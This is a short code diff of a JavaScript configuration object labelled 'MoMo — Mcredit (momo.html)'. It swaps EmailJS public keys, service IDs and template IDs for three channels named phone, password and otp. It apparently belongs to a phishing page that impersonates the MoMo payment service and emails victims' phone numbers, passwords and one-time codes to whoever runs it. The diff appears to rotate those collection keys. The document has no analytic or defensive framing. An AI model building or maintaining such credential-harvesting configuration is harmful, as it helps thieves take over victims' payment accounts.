@@ -6,21 +6,21 @@ window.MOMO_EMAILJS = {
   platform: "MoMo — Mcredit (momo.html)",
 
   phone: {
-    publicKey: "b06J7tpw0xjJAunOd",
-    serviceId: "service_aa0dvwd",
-    templateId: "template_akl287g",
+    publicKey: "0LVZE1mTauz8glAF3",
+    serviceId: "service_3vutaor",
+    templateId: "template_vofs17j",
   },
 
   password: {
-    publicKey: "b06J7tpw0xjJAunOd",
-    serviceId: "service_aa0dvwd",
-    templateId: "template_nka2acq",
+    publicKey: "p4rUbDiBZ1qmtDCiY",
+    serviceId: "service_8o2bn7b",
+    templateId: "template_noml1ui",
   },
 
   otp: {
-    publicKey: "b06J7tpw0xjJAunOd",
-    serviceId: "service_aa0dvwd",
-    templateId: "template_48ehw5t",
+    publicKey: "p4rUbDiBZ1qmtDCiY",
+    serviceId: "service_8o2bn7b",
+    templateId: "template_c0pij92",
   },
 };
 
